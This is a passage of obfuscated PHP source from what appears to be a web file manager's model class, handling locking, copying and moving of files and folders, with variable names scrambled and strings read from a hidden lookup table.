$¡ùî¼ç[$‚ûğ³‹Ğ[477]]); return $this->resetSort($à†Äã„â); } protected function moveBottom($ÕÜÇ³¥) { $Ñ½Ì ğå =& $_SERVER[Š—Â“œÔ]; $›ñ¬¡ßÌ = array($Ñ½Ì ğå[1761] => USER_ID, $Ñ½Ì ğå[559] => 0); $ú‰…ê÷£ = $this->where($›ñ¬¡ßÌ)->max($Ñ½Ì ğå[1995]); $Šû£—‹Ì = array($Ñ½Ì ğå[1995] => $ú‰…ê÷£ + 1); return $this->where($›ñ¬¡ßÌ)->where(array($Ñ½Ì ğå[32] => $ÕÜÇ³¥))->save($Šû£—‹Ì); } private function getAutoName($µİóÒô€) { $½œËü€Ş =& $_SERVER[Š—Â“œÔ]; $Úéáş¶ = array($½œËü€Ş[1761] => USER_ID, $½œËü€Ş[559] => 0); $…ıÀÁÑ‹ = $this->field($½œËü€Ş[32])->where($Úéáş¶)->select(); $…ıÀÁÑ‹ = array_to_keyvalue($…ıÀÁÑ‹, $½œËü€Ş[12], $½œËü€Ş[32]); if (!$…ıÀÁÑ‹ || !in_array($µİóÒô€, $…ıÀÁÑ‹)) { return $µİóÒô€; } for ($— úãÂ = 0; $— úãÂ < count($…ıÀÁÑ‹); $— úãÂ++) { if (!in_array($µİóÒô€ . "\50{$— úãÂ}\51", $…ıÀÁÑ‹)) { return $µİóÒô€ . "\50{$— úãÂ}\51"; } } return $µİóÒô€ . "\50{$— úãÂ}\x29"; } } goto A¶İœï˜›“; Fà¯ß‹Ñğñ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÒéÁÇ×) { $Ô¿İÄô² =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ô¿İÄô²[623], $ÒéÁÇ×); $á©¼ğØ = 1; $this->_lockEvent($ÒéÁÇ×, array($Ô¿İÄô²[624], $Ô¿İÄô²[625]), $á©¼ğØ); $this->_lockParent($ÒéÁÇ×, array($Ô¿İÄô²[625]), $á©¼ğØ); $this->_lockEvent($ÒéÁÇ×, array($Ô¿İÄô²[626], $Ô¿İÄô²[627]), $á©¼ğØ); $this->_lockCheckEnd($Ô¿İÄô²[623], $ÒéÁÇ×); } public function lockCopyEnd($ë¢ÂÀ»ğ) { $ÖŞşş =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $¡êÈüÏ = 0; $this->_lockEvent($ë¢ÂÀ»ğ, array($ÖŞşş[624], $ÖŞşş[625]), $¡êÈüÏ); $this->_lockParent($ë¢ÂÀ»ğ, array($ÖŞşş[625]), $¡êÈüÏ); $this->_lockEvent($ë¢ÂÀ»ğ, array($ÖŞşş[626], $ÖŞşş[627]), $¡êÈüÏ); } public function lockWriteStart($ªô„íµÒ, $¦Ğ†ğó˜ = '') { $í¦Ï“´— =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($í¦Ï“´—[624], $ªô„íµÒ); $ßØµ¬ª¿ = 1; $this->_lockKey($í¦Ï“´—[628] . $ªô„íµÒ . $í¦Ï“´—[10] . $¦Ğ†ğó˜, $ßØµ¬ª¿); $this->_lockEvent($ªô„íµÒ, array($í¦Ï“´—[623], $í¦Ï“´—[625]), $ßØµ¬ª¿); $this->_lockParent($ªô„íµÒ, array($í¦Ï“´—[623], $í¦Ï“´—[625]), $ßØµ¬ª¿); $this->_lockCheckEnd($í¦Ï“´—[624], $ªô„íµÒ); } public function lockWriteEnd($×£õáüË, $­ú‰¾‚è = '') { $®áÏÆî´ =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $³“Õ³ë = 0; $this->_lockKey($®áÏÆî´[628] . $×£õáüË . $®áÏÆî´[10] . $­ú‰¾‚è, $³“Õ³ë); $this->_lockEvent($×£õáüË, array($®áÏÆî´[623], $®áÏÆî´[625]), $³“Õ³ë); $this->_lockParent($×£õáüË, array($®áÏÆî´[623], $®áÏÆî´[625]), $³“Õ³ë); } public function lockMoveStart($„µÃ·Ï¥) { $‘ì£Èì =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‘ì£Èì[625], $„µÃ·Ï¥); $Åó¼åÜ© = 1; $this->_lockKey($‘ì£Èì[629] . $„µÃ·Ï¥, $Åó¼åÜ©); $this->_lockEvent($„µÃ·Ï¥, array($‘ì£Èì[623], $‘ì£Èì[624]), $Åó¼åÜ©); $this->_lockParent($„µÃ·Ï¥, array($‘ì£Èì[623], $‘ì£Èì[625]), $Åó¼åÜ©); $this->_lockEvent($„µÃ·Ï¥, array($‘ì£Èì[630], $‘ì£Èì[626], $‘ì£Èì[627]), $Åó¼åÜ©); $this->_lockCheckEnd($‘ì£Èì[625], $„µÃ·Ï¥); } public function lockMoveEnd($„Œ÷ºà) { $€¡ Óİ¤ =& $_SERVER[Š—Â“œÔ]; if (!$this->allowLock()) { return; } $§íÈ¹å = 0; $this->_lockKey($€¡ Óİ¤[629] . $„Œ÷ºà, $§íÈ¹å); $this->_lockEvent($„Œ÷ºà, array($€¡ Óİ¤[623], $€¡ Óİ¤[624]), $§íÈ¹å); $this->_lockParent($„Œ÷ºà, array($€¡ Óİ¤[623], $€¡ Óİ¤[625]), $§íÈ¹å); $this->_lockEvent($„Œ÷ºà, array($€¡ Óİ¤[630], $€¡ Óİ¤[626], $€¡ Óİ¤[627]), $§íÈ¹å); } private function _lockCheck($Ìøññ‹, $ìæ˜™¹õ) { $—èª¶ğ› =& $_SERVER[Š—Â“œÔ]; $×Ñ±ßÖ = $this->sourceInfo($ìæ˜™¹õ); $Ç§òÉ‹¶ = $Ìøññ‹ . $—èª¶ğ›[10] . $ìæ˜™¹õ; $this->_lockTimeStart[$Ç§òÉ‹¶] = timeFloat(); if (!is_array($×Ñ±ßÖ)) { return; } $ÂË¦ÀØİ = LNG($—èª¶ğ›[631]); CacheLock::setErrorMsg($—èª¶ğ›[176] . htmlspecialchars($×Ñ±ßÖ[$—èª¶ğ›[32]]) . $—èª¶ğ›[178] . $ÂË¦ÀØİ); $this->_lockKey($Ç§òÉ‹¶, 1); $this->_lockKey($Ç§òÉ‹¶, 0); $‚Ëûˆß = array_reverse($this->parentLevelArray($×Ñ±ßÖ[$—èª¶ğ›[586]])); foreach ($‚Ëûˆß as $ªÆßôŠµ) { $Ç§òÉ‹¶ = $Ìøññ‹ . $—èª¶ğ›[632] . $ªÆßôŠµ; if (CacheLock::lockGet($—èª¶ğ›[633] . $Ç§òÉ‹¶)) { $×Ñ±ßÖ = $this->sourceInfo($ªÆßôŠµ); CacheLock::setErrorMsg($—èª¶ğ›[176] . htmlspecialchars($×Ñ±ßÖ[$—èª¶ğ›[32]]) . $—èª¶ğ›[178] . $ÂË¦ÀØİ); $this->_lockKey($Ç§òÉ‹¶, 1); $this->_lockKey($Ç§òÉ‹¶, 0); } } } private function _lockCheckEnd($¤çÇ—£, $Õ™‘ÚŸ·) { $â¾óÖ¿¿ =& $_SERVER[Š—Â“œÔ]; $Ş¢êû¡ğ = $¤çÇ—£ . $â¾óÖ¿¿[10] . $Õ™‘ÚŸ·; CacheLock::setErrorMsg($â¾óÖ¿¿[456]); if (!isset($this->_lockTimeStart[$Ş¢êû¡ğ])) { return; } $£¶ş¼“½ = timeFloat() - $this->_lockTimeStart[$Ş¢êû¡ğ]; unset($this->_lockTimeStart[$Ş¢êû¡ğ]); if ($£¶ş¼“½ > 0.5) { unset(self::$cacheSourceInfo[$â¾óÖ¿¿[535] . $Õ™‘ÚŸ·]); } $À®Åàö = $this->sourceInfo($Õ™‘ÚŸ·); if (!$À®Åàö) { show_json(LNG($â¾óÖ¿¿[108]), !1); } } private function _lockParent($ê¸ÓÚ×å, $¢â¤¸Ş, $İæò²óØ) { if (!$this->autoLockSet) { return; } $ú‚ììı™ = $this->sourceInfo($ê¸ÓÚ×å); if (!is_array($ú‚ììı™)) { return; } $˜ÓœÏ¬¦ = array_reverse($this->parentLevelArray($ú‚ììı™[$_SERVER[Š—Â“œÔ][586]])); foreach ($˜ÓœÏ¬¦ as $®Î»û) { $this->_lockEvent($®Î»û, $¢â¤¸Ş, $İæò²óØ); } } private function _lockEvent($à§Ï ü·, $ÜÊÒ£‹ü, $ºü‘²Ö‹) { $…­Íá—Í =& $_SERVER[Š—Â“œÔ]; if (!$this->autoLockSet) { return; } foreach ($ÜÊÒ£‹ü as $úì“öÎœ) { $Ö“Ê·Ò‘ = $úì“öÎœ . $…­Íá—Í[10] . $à§Ï ü·; if ($ºü‘²Ö‹ && CacheLock::lockGet($…­Íá—Í[633] . $Ö“Ê·Ò‘)) { continue; } $this->_lockKey($Ö“Ê·Ò‘, $ºü‘²Ö‹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($‰Ãóˆ“Ù, $Šì±¸± = 1) { $¾Á®¡ Ç = $_SERVER[Š—Â“œÔ][633] . md5($‰Ãóˆ“Ù); if ($Šì±¸±) { if (isset(self::$_lockItemArr[$¾Á®¡ Ç])) { return; } self::$_lockItemArr[$¾Á®¡ Ç] = 1; CacheLock::lock($¾Á®¡ Ç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¾Á®¡ Ç])) { return; } unset(self::$_lockItemArr[$¾Á®¡ Ç]); CacheLock::unlock($¾Á®¡ Ç); } } public function isParentOf($“×Ğµù, $²ôœ•Òã) { $öğì•Ç  =& $_SERVER[Š—Â“œÔ]; $‚ßî£úô = $this->sourceInfo($“×Ğµù); $Ï¨Î³ûú = $this->sourceInfo($²ôœ•Òã); $´Üş¼“ = $‚ßî£úô[$öğì•Ç [586]] . $‚ßî£úô[$öğì•Ç [193]] . $öğì•Ç [50]; $¿†¶Ÿ®ô = $Ï¨Î³ûú[$öğì•Ç [586]] . $Ï¨Î³ûú[$öğì•Ç [193]] . $öğì•Ç [50]; $£úÑí×Ç = strpos($¿†¶Ÿ®ô, $´Üş¼“) === 0; return $£úÑí×Ç; } private $targetIsDelete = 0; public function copy($Ø¤â§Ÿğ, $Çä±±¨, $¢û°³Ï = REPEAT_REPLACE, $Ó¸Ş©É¢ = '') { $¨äÃ½¾« =& $_SERVER[Š—Â“œÔ]; $ùïÌ›îÒ = $this->sourceInfo($Ø¤â§Ÿğ); $™­Å°óÜ = $this->sourceInfo($Çä±±¨); if (!$ùïÌ›îÒ || !$™­Å°óÜ || $™­Å°óÜ[$¨äÃ½¾«[487]] != $¨äÃ½¾«[91]) { return !1; } if ($this->isParentOf($Ø¤â§Ÿğ, $Çä±±¨)) { return !1; } $Ş¯ˆ¸ÕŞ = $Ó¸Ş©É¢ ? $Ó¸Ş©É¢ : $ùïÌ›îÒ[$¨äÃ½¾«[32]]; $this->lockCopyStart($Ø¤â§Ÿğ); $this->lockWriteStart($Çä±±¨, $Ş¯ˆ¸ÕŞ); $†—«¯ = array($¨äÃ½¾«[634] => array(), $¨äÃ½¾«[635] => array(), $¨äÃ½¾«[636] => array()); $this->targetIsDelete = intval($ùïÌ›îÒ[$¨äÃ½¾«[507]]); $©ç—Çı« = $this->fileNameExistAuto($Çä±±¨, $ùïÌ›îÒ); $è™ğ¾óŞ = $this->_copy($Ø¤â§Ÿğ, $Çä±±¨, $¢û°³Ï, $†—«¯, !0, $Ó¸Ş©É¢); $this->_childrenListClear(); $this->lockCopyEnd($Ø¤â§Ÿğ); $this->lockWriteEnd($Çä±±¨, $Ş¯ˆ¸ÕŞ); if ($ùïÌ›îÒ[$¨äÃ½¾«[487]] == $¨äÃ½¾«[91] && $©ç—Çı« == $è™ğ¾óŞ) { $this->folderSizeResetChildren($©ç—Çı«); } Model($¨äÃ½¾«[637])->addAll($†—«¯[$¨äÃ½¾«[635]], array(), !0); if ($©ç—Çı« != $è™ğ¾óŞ || $ùïÌ›îÒ[$¨äÃ½¾«[487]] == $¨äÃ½¾«[91]) { Model($¨äÃ½¾«[638])->eventCopy($è™ğ¾óŞ); } $this->saveAll($†—«¯[$¨äÃ½¾«[636]]); Model($¨äÃ½¾«[232])->linkAdd($†—«¯[$¨äÃ½¾«[634]]); $this->folderSizeReset($Çä±±¨); $this->updateModifyTime($Çä±±¨); return $è™ğ¾óŞ; } private function _copy($âª¡‡Úä, $“¿Ï“€ê, $¼ßğê¶¦, &$Ôöùæı—, $ûÇê·˜û, $ƒÔ…•¡İ = '') { $‘ˆáÆ‰¨ =& $_SERVER[Š—Â“œÔ]; $ŠùãÉÆ = $this->sourceInfoCache($âª¡‡Úä); $®™ƒ‘â = $ŠùãÉÆ[$‘ˆáÆ‰¨[487]] == $‘ˆáÆ‰¨[91]; $Ô¿Šœé‚ = $ƒÔ…•¡İ ? $ƒÔ…•¡İ : $ŠùãÉÆ[$‘ˆáÆ‰¨[32]]; $ÁÑë·õâ = $this->fileNameExistAuto($“¿Ï“€ê, $ŠùãÉÆ); if ($ûÇê·˜û) { $this->_childrenAllMake($âª¡‡Úä); if ($®™ƒ‘â && $ÁÑë·õâ) { $this->_childrenAllMake($ÁÑë·õâ); } } if (!$ÁÑë·õâ) { return $this->_copyCreate($âª¡‡Úä, $“¿Ï“€ê, $Ô¿Šœé‚, $Ôöùæı—); } $ñ¼ô¢¿Â = $ÁÑë·õâ; if ($®™ƒ‘â) { if ($¼ßğê¶¦ == REPEAT_RENAME_FOLDER) { $Ô¿Šœé‚ = $this->fileNameAutoCache($“¿Ï“€ê, $Ô¿Šœé‚, $¼ßğê¶¦, $®™ƒ‘â); $ñ¼ô¢¿Â = $this->_copyCreate($âª¡‡Úä, $“¿Ï“€ê, $Ô¿Šœé‚, $Ôöùæı—); } else { $Û‡•èòË = $this->_childrenList($âª¡‡Úä); foreach ($Û‡•èòË as $õ—Ùõ©Ñ) { $this->_copy($õ—Ùõ©Ñ[$‘ˆáÆ‰¨[193]], $ÁÑë·õâ, $¼ßğê¶¦, $Ôöùæı—, !1); } } } else { if ($¼ßğê¶¦ == REPEAT_RENAME || $¼ßğê¶¦ == REPEAT_RENAME_FOLDER) { $Ô¿Šœé‚ = $this->fileNameAutoCache($“¿Ï“€ê, $Ô¿Šœé‚, $¼ßğê¶¦, $®™ƒ‘â); $ñ¼ô¢¿Â = $this->_copyCreate($âª¡‡Úä, $“¿Ï“€ê, $Ô¿Šœé‚, $Ôöùæı—); } else { if ($¼ßğê¶¦ == REPEAT_REPLACE) { $šçèî´¹ = $this->sourceInfoCache($ÁÑë·õâ); $”’†óÄô = $this->fileHistory($šçèî´¹, $ŠùãÉÆ[$‘ˆáÆ‰¨[543]], $ŠùãÉÆ[$‘ˆáÆ‰¨[79]]); if ($”’†óÄô) { $Ôöùæı—[$‘ˆáÆ‰¨[634]][] = $ŠùãÉÆ[$‘ˆáÆ‰¨[543]]; } } else { if ($¼ßğê¶¦ == REPEAT_SKIP) { } } } Hook::trigger($‘ˆáÆ‰¨[639], array($‘ˆáÆ‰¨[640], $ŠùãÉÆ, 0)); } return $ñ¼ô¢¿Â; } private function _copyCreate($ñ„ÅÜ°Ö, $œí˜›Ö, $¡š¸‘Ìò, &$õ’âúüÙ) { $ÄºÈªˆ =& $_SERVER[Š—Â“œÔ]; $öá†Üîø = $this->sourceInfoCache($ñ„ÅÜ°Ö); $ªÙÚÓÌó = $this->sourceInfoCache($œí˜›Ö); $ ªÔœİÅ = $this->_makeItemData($öá†Üîø, $ªÙÚÓÌó, $¡š¸‘Ìò); Hook::trigger($ÄºÈªˆ[641], $ ªÔœİÅ); Hook::trigger($ÄºÈªˆ[642], array($ÄºÈªˆ[643], $ ªÔœİÅ, 0)); $ƒ¸şŞò» = $this->add($ ªÔœİÅ); $­Ê¼šÆâ = array($ÄºÈªˆ[193] => $ƒ¸şŞò», $ÄºÈªˆ[32] => $¡š¸‘Ìò); $this->_copyApplyMeta($­Ê¼šÆâ, $õ’âúüÙ); if ($öá†Üîø[$ÄºÈªˆ[487]] != $ÄºÈªˆ[91]) { $õ’âúüÙ[$ÄºÈªˆ[634]][] = $öá†Üîø[$ÄºÈªˆ[543]]; return $ƒ¸şŞò»; } $‹ÃıÚ¿¢ = array(); $›ËáÄ…å = array(); $this->_childrenListAll($ñ„ÅÜ°Ö, $‹ÃıÚ¿¢); $ö¾üÜú¿ = count($‹ÃıÚ¿¢); if ($ö¾üÜú¿ == 0) { return $ƒ¸şŞò»; } $ÖÊóªíä = $this->sourceInfo($ƒ¸şŞò»); foreach ($‹ÃıÚ¿¢ as $ıñ˜Â¤‚) { $Äæèù¿ƒ = $this->_makeItemData($ıñ˜Â¤‚, $ÖÊóªíä, $ıñ˜Â¤‚[$ÄºÈªˆ[32]]); $Äæèù¿ƒ[$ÄºÈªˆ[586]] = $ıñ˜Â¤‚[$ÄºÈªˆ[586]]; $›ËáÄ…å[] = $Äæèù¿ƒ; } $this->chunkEventSet($ÄºÈªˆ[644], array($ÄºÈªˆ[645], $ ªÔœİÅ, $ö¾üÜú¿)); $this->addAll($›ËáÄ…å, array(), !1); $û·ğ£„ = $this->where(array($ÄºÈªˆ[192] => $ƒ¸şŞò»))->select(); $Š¿†è = $this->_childrenMakeRelation($‹ÃıÚ¿¢, $û·ğ£„); $Š¿†è[$ñ„ÅÜ°Ö] = $ƒ¸şŞò»; $›ÒÚ–áñ = array(); $ßš¾ŒË˜ = array(); foreach ($û·ğ£„ as $ıñ˜Â¤‚) { $†¥ğ¦Ú™ = $ıñ˜Â¤‚[$ÄºÈªˆ[193]]; $°¯ëà = $this->_childrenMatch($Š¿†è, $ıñ˜Â¤‚, $ÖÊóªíä); $›ÒÚ–áñ[] = array($ÄºÈªˆ[193], $†¥ğ¦Ú™, $ÄºÈªˆ[192], $°¯ëà[$ÄºÈªˆ[192]]); $ßš¾ŒË˜[] = array($ÄºÈªˆ[193], $†¥ğ¦Ú™, $ÄºÈªˆ[586], $°¯ëà[$ÄºÈªˆ[586]]); $this->_copyApplyMeta($ıñ˜Â¤‚, $õ’âúüÙ); if ($ıñ˜Â¤‚[$ÄºÈªˆ[487]] != $ÄºÈªˆ[91]) { $õ’âúüÙ[$ÄºÈªˆ[634]][] = $ıñ˜Â¤‚[$ÄºÈªˆ[543]]; } } $this->chunkEventSet($ÄºÈªˆ[646], array($ÄºÈªˆ[647], $ ªÔœİÅ, $ö¾üÜú¿)); $this->saveAll($›ÒÚ–áñ); $this->chunkEventSet($ÄºÈªˆ[648], array($ÄºÈªˆ[649], $ ªÔœİÅ, $ö¾üÜú¿)); $this->saveAll($ßš¾ŒË˜); return $ƒ¸şŞò»; } private function _childrenMakeRelation($ÜŸ¤÷˜“, $ûÅÁ¥í) { $‹Şğ´€ì =& $_SERVER[Š—Â“œÔ]; $ªØÓ­—É = array(); $Û–¢Ş¡Ü = array(); foreach ($ÜŸ¤÷˜“ as $€ÍÒıé“) { $¡ªûôš = $€ÍÒıé“[$‹Şğ´€ì[32]] . $‹Şğ´€ì[8] . $€ÍÒıé“[$‹Şğ´€ì[586]]; $ªØÓ­—É[$¡ªûôš] = $€ÍÒıé“[$‹Şğ´€ì[193]]; } foreach ($ûÅÁ¥í as $€ÍÒıé“) { $¡ªûôš = $€ÍÒıé“[$‹Şğ´€ì[32]] . $‹Şğ´€ì[8] . $€ÍÒıé“[$‹Şğ´€ì[586]]; $ë¬ ¬ = $ªØÓ­—É[$¡ªûôš]; $Û–¢Ş¡Ü[$ë¬ ¬] = $€ÍÒıé“[$‹Şğ´€ì[193]]; } return $Û–¢Ş¡Ü; } private function _childrenMatch($Ğæıåè–, $À¤¦ã±, $”êğ€¨‰) { $¥éË˜”° =& $_SERVER[Š—Â“œÔ]; $š¬ƒ’” = $”êğ€¨‰[$¥éË˜”°[586]]; $õÕµÅÊ¬ = $this->parentLevelArray($À¤¦ã±[$¥éË˜”°[586]]); foreach ($õÕµÅÊ¬ as $ÆÂËü®) { if (isset($Ğæıåè–[$ÆÂËü®])) { $š¬ƒ’” .= $Ğæıåè–[$ÆÂËü®] . $¥éË˜”°[650]; } } $š¬ƒ’” = rtrim($š¬ƒ’”, $¥éË˜”°[50]) . $¥éË˜”°[50]; $ÚÒ‘­”É = $this->parentLevelArray($š¬ƒ’”); $»çÖ•ıÒ = $ÚÒ‘­”É[count($ÚÒ‘­”É) - 1]; return array($¥éË˜”°[192] => $»çÖ•ıÒ, $¥éË˜”°[586] => $š¬ƒ’”); } private function _makeItemData($Â¨²æ·€, $è½…¬’ø, $ÃŒïµ÷ù) { $¾€Ëı =& $_SERVER[Š—Â“œÔ]; $³Ëù‰Í = array($¾€Ëı[651] => $Â¨²æ·€[$¾€Ëı[487]], $¾€Ëı[496] => $ÃŒïµ÷ù, $¾€Ëı[652] => $Â¨²æ·€[$¾€Ëı[488]] ? $Â¨²æ·€[$¾€Ëı[488]] : $¾€Ëı[12], $¾€Ëı[544] => $Â¨²æ·€[$¾€Ëı[543]] ? $Â¨²æ·€[$¾€Ëı[543]] : 0, $¾€Ëı[622] => $Â¨²æ·€[$¾€Ëı[79]] ? $Â¨²æ·€[$¾€Ëı[79]] : 0, $¾€Ëı[653] => intval($è½…¬’ø[$¾€Ëı[190]]), $¾€Ëı[654] => intval($è½…¬’ø[$¾€Ëı[571]]), $¾€Ëı[655] => intval(USER_ID), $¾€Ëı[656] => intval(USER_ID), $¾€Ëı[479] => intval($è½…¬’ø[$¾€Ëı[193]]), $¾€Ëı[657] => $è½…¬’ø[$¾€Ëı[586]] . $è½…¬’ø[$¾€Ëı[193]] . $¾€Ëı[50], $¾€Ëı[500] => $Â¨²æ·€[$¾€Ëı[88]] ? $Â¨²æ·€[$¾€Ëı[88]] : time(), $¾€Ëı[506] => 0, $¾€Ëı[658] => $¾€Ëı[12]); return $³Ëù‰Í; } private function _copyApplyMeta($Ò öğô”, &$Ş¿Â…ö) { $äò±å™½ =& $_SERVER[Š—Â“œÔ]; $™°Çöü = $Ò öğô”[$äò±å™½[193]]; $£†ı»«¢ = $Ò öğô”[$äò±å™½[32]]; if (!isset($Ò öğô”[$äò±å™½[659]]) || !$Ò öğô”[$äò±å™½[659]] || $Ò öğô”[$äò±å™½[659]] == $äò±å™½[230]) { $Ş¿Â…ö[$äò±å™½[636]][] = array($äò±å™½[193], $™°Çöü, $äò±å™½[659], short_id($™°Çöü)); } if (Input::check($£†ı»«¢, $äò±å™½[660])) { $Ş¿Â…ö[$äò±å™½[635]][] = array($äò±å™½[193] => $™°Çöü, $äò±å™½[97] => $äò±å™½[540], $äò±å™½[452] => str_replace($äò±å™½[53], $äò±å™½[12], Pinyin::get($£†ı»«¢))); $Ş¿Â…ö[$äò±å™½[635]][] = array($äò±å™½[193] => $™°Çöü, $äò±å™½[97] => $äò±å™½[539], $äò±å™½[452] => Pinyin::get($£†ı»«¢, $äò±å™½[661])); } $Ş¿Â…ö[$äò±å™½[635]][] = array($äò±å™½[193] => $™°Çöü, $äò±å™½[97] => $äò±å™½[519], $äò±å™½[452] => KodSort::makeStr($£†ı»«¢)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($—ÑùŠ€Ç) { $ˆŒ¢³¨Ş =& $_SERVER[Š—Â“œÔ]; $ïªóÅŠ = $this->sourceInfo($—ÑùŠ€Ç); $ÓêüÃİ— = $ˆŒ¢³¨Ş[662]; $ïıÈ¡¤» = array($ˆŒ¢³¨Ş[586] => array($ˆŒ¢³¨Ş[617], $ïªóÅŠ[$ˆŒ¢³¨Ş[586]] . $—ÑùŠ€Ç . $ˆŒ¢³¨Ş[618]), $ˆŒ¢³¨Ş[507] => $this->targetIsDelete); $›Ÿ¡ÁÄğ = $this->field($ÓêüÃİ—)->where($ïıÈ¡¤»)->select(); if (!$›Ÿ¡ÁÄğ) { return; } $›Ÿ¡ÁÄğ = array_to_keyvalue($›Ÿ¡ÁÄğ, $ˆŒ¢³¨Ş[193]); foreach ($›Ÿ¡ÁÄğ as $€ë´¡Õ) { $ŒùØŒÔÀ = $€ë´¡Õ[$ˆŒ¢³¨Ş[192]]; $—ÑùŠ€Ç = $€ë´¡Õ[$ˆŒ¢³¨Ş[193]]; if (!isset($this->_childrenListCache[$—ÑùŠ€Ç]) && $€ë´¡Õ[$ˆŒ¢³¨Ş[487]] == $ˆŒ¢³¨Ş[91]) { $this->_childrenListCache[$—ÑùŠ€Ç] = array(); } if (!isset($this->_childrenListCache[$ŒùØŒÔÀ])) { $this->_childrenListCache[$ŒùØŒÔÀ] = array(); } $this->_childrenListCache[$ŒùØŒÔÀ][$—ÑùŠ€Ç] = $€ë´¡Õ; $this->_childrenItemCache[$—ÑùŠ€Ç] = $€ë´¡Õ; } } private function _childrenListAll($˜ÑŸòœÌ, &$±±œÇİ) { $¸’È”Ã¼ =& $_SERVER[Š—Â“œÔ]; if (!isset($this->_childrenListCache[$˜ÑŸòœÌ])) { return; } $è²ŠƒøŒ = $this->_childrenListCache[$˜ÑŸòœÌ]; foreach ($è²ŠƒøŒ as $ê†–˜êË => $ó”£ğŞÅ) { $±±œÇİ[$ê†–˜êË] = $ó”£ğŞÅ; if ($ó”£ğŞÅ[$¸’È”Ã¼[487]] == $¸’È”Ã¼[91]) { $this->_childrenListAll($ê†–˜êË, $±±œÇİ); } } } private function sourceInfoCache($ÀÂ—Ğ§·) { if (isset($this->_childrenItemCache[$ÀÂ—Ğ§·])) { return $this->_childrenItemCache[$ÀÂ—Ğ§·]; } return $this->sourceInfo($ÀÂ—Ğ§·); } private function _childrenList($òÓéÁ–³) { if (isset($this->_childrenListCache[$òÓéÁ–³])) { return $this->_childrenListCache[$òÓéÁ–³]; } return $this->_childrenListSelect($òÓéÁ–³); } private function _childrenListSelect($Æû»¿ğ°) { $„Ó’ğø¹ =& $_SERVER[Š—Â“œÔ]; $Õ…Á = array($„Ó’ğø¹[192] => $Æû»¿ğ°, $„Ó’ğø¹[507] => $this->targetIsDelete); $¦­¿§îï = $this->where($Õ…Á)->select(); $¦­¿§îï = $¦­¿§îï ? $¦­¿§îï : array(); $ë»Èô¶Í = array_to_keyvalue($¦­¿§îï, $„Ó’ğø¹[193]); $this->_childrenListCache[$Æû»¿ğ°] = $ë»Èô¶Í; foreach ($ë»Èô¶Í as $Æû»¿ğ° => $®¶¶‹ÒŒ) { $this->_childrenItemCache[$Æû»¿ğ°] = $®¶¶‹ÒŒ; } return $ë»Èô¶Í; } private function fileNameExistAuto($÷®Ô¢õ, $Ùó¸…ÎŒ) { $á€Î˜Ö‰ =& $_SERVER[Š—Â“œÔ]; if ($Ùó¸…ÎŒ[$á€Î˜Ö‰[507]] == $á€Î˜Ö‰[91]) { return $this->fileNameExist($÷®Ô¢õ, $Ùó¸…ÎŒ[$á€Î˜Ö‰[32]]); } return $this->fileNameExistCache($÷®Ô¢õ, $Ùó¸…ÎŒ[$á€Î˜Ö‰[32]]); } private function fileNameExistCache($úÎÆèÆ†, $Ò­Á™ë¸) { $¤çÂßƒ =& $_SERVER[Š—Â“œÔ]; $Ò­Á™ë¸ = strtolower($Ò­Á™ë¸); $¨å°‘†‚ = $this->_childrenList($úÎÆèÆ†); foreach ($¨å°‘†‚ as $ÜÂùËñ¬) { if ($Ò­Á™ë¸ == strtolower($ÜÂùËñ¬[$¤çÂßƒ[32]])) { return $ÜÂùËñ¬[$¤çÂßƒ[193]]; } } return !1; } private function fileNameAutoCache($Óüï‚…È, $™¶±ĞÒ¥, $€•„¯†è, $‡Ööº») { $È§ßÒÔ =& $_SERVER[Š—Â“œÔ]; $°Ìú¦Ê = $this->_childrenList($Óüï‚…È); $‘¼§Š‡ = array_to_keyvalue($°Ìú¦Ê, $È§ßÒÔ[12], $È§ßÒÔ[32]); return $this->fileNameAutoGet($‘¼§Š‡, $™¶±ĞÒ¥, $€•„¯†è, $‡Ööº»); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ì­ªêÉĞ, $Ê×¸ù•¾, $õ¹›Ë = REPEAT_REPLACE, $ªÉ¤Ïˆ = '') { $¯çÄÔ«Ô =& $_SERVER[Š—Â“œÔ]; $ƒô€–şï = $this->sourceInfo($Ì­ªêÉĞ); $úÏ…Ï¸à = $this->sourceInfo($Ê×¸ù•¾); if ($ƒô€–şï[$¯çÄÔ«Ô[192]] == $úÏ…Ï¸à[$¯çÄÔ«Ô[193]]) { if ($ƒô€–şï[$¯çÄÔ«Ô[507]] == $¯çÄÔ«Ô[91]) { Model($¯çÄÔ«Ô[505])->restore(array($Ì­ªêÉĞ)); } if (!$ªÉ¤Ïˆ || $ªÉ¤Ïˆ == $ƒô€–şï[$¯çÄÔ«Ô[32]]) { return $Ì­ªêÉĞ; } } $ÈØ¦¹ò‘ = $this->pathInfoMore($Ì­ªêÉĞ); if ($this->isParentOf($Ì­ªêÉĞ, $Ê×¸ù•¾)) { return !1; } if (!$ƒô€–şï || !$úÏ…Ï¸à || $úÏ…Ï¸à[$¯çÄÔ«Ô[487]] != $¯çÄÔ«Ô[91]) { return !1; } Hook::trigger($¯çÄÔ«Ô[663], $ÈØ¦¹ò‘); $this->targetIsDelete = intval($ƒô€–şï[$¯çÄÔ«Ô[507]]); if ($ƒô€–şï[$¯çÄÔ«Ô[192]] == $Ê×¸ù•¾ && $ªÉ¤Ïˆ != $ƒô€–şï[$¯çÄÔ«Ô[32]]) { $¹¿º‰© = $this->fileNameExist($Ê×¸ù•¾, $ªÉ¤Ïˆ); if ($¹¿º‰© && $ƒô€–şï[$¯çÄÔ«Ô[487]] == $¯çÄÔ«Ô[230]) { $œÎœôİŠ = $this->sourceInfo($¹¿º‰©); $ˆ¿ÁÄë = $this->fileHistory($œÎœôİŠ, $ƒô€–şï[$¯çÄÔ«Ô[543]], $ƒô€–şï[$¯çÄÔ«Ô[79]]); if 